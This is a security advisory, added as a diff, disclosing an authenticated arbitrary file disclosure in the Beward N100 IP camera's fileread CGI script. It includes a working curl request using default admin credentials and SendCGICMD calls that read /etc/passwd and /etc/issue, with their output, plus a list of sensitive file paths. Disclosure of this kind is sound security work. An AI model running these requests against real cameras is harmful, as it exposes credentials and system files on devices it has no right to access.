@@ -1,0 +1,80 @@
+BEWARD N100 H.264 VGA IP Camera M2.1.6 Arbitrary File Disclosure
+
+Vendor: Beward R&D Co., Ltd
+Product web page: https://www.beward.net
+Affected version: M2.1.6.04C014
+
+Summary: The N100 compact color IP camera with support for a more efficient
+compression format is optimized for low-speed networks, thanks to which it
+transmits a real-time image over the network with minimal delays. The camera
+supports the switching of the broadcast modes, and in the event of a break in
+communication with the remote file storage, it can continue recording to the
+microSDHC memory card. N100 is easy to install and configure, has all the
+necessary arsenal for the organization of low-cost professional video surveillance
+systems.
+
+Desc: The camera suffers from an authenticated file disclosure vulnerability.
+Input passed via the 'READ.filePath' parameter in fileread script is not properly
+verified before being used to read files. This can be exploited to disclose
+the contents of arbitrary files via absolute path or via the SendCGICMD API.
+
+Tested on: Boa/0.94.14rc21
+           Farady ARM Linux 2.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5511
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php
+
+
+26.01.2019
+
+
+--
+From the term:
+--
+root@ground:~# curl -H "Authorization: Basic YWRtaW46YWRtaW4=" http://TARGET/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/usr/sbin:/bin/sh
+adm:x:3:4:adm:/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/bin:/bin/sync
+shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:Operator:/var:/bin/sh
+nobody:x:99:99:nobody:/home:/bin/sh
+
+--
+From the web console:
+--
+SendCGICMD("cgi-bin/operator/fileread?READ.filePath=/etc/passwd")
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/usr/sbin:/bin/sh
+adm:x:3:4:adm:/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/bin:/bin/sync
+shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:Operator:/var:/bin/sh
+nobody:x:99:99:nobody:/home:/bin/sh
+
+--
+SendCGICMD("cgi-bin/operator/fileread?READ.filePath=/etc/issue")
+--
+Welcome to \n (\m-\s-\r@\l/\b)
+Faraday ARM Linux 2.6
+
+Copyright (C) 2005 Faraday Corp. <www.faraday.com.tw>
+Released under GNU GPL
+
+--
+wr: /usr/share/www/html
+sp: /var/www/secret.passwd
+bc: /etc/boa.conf
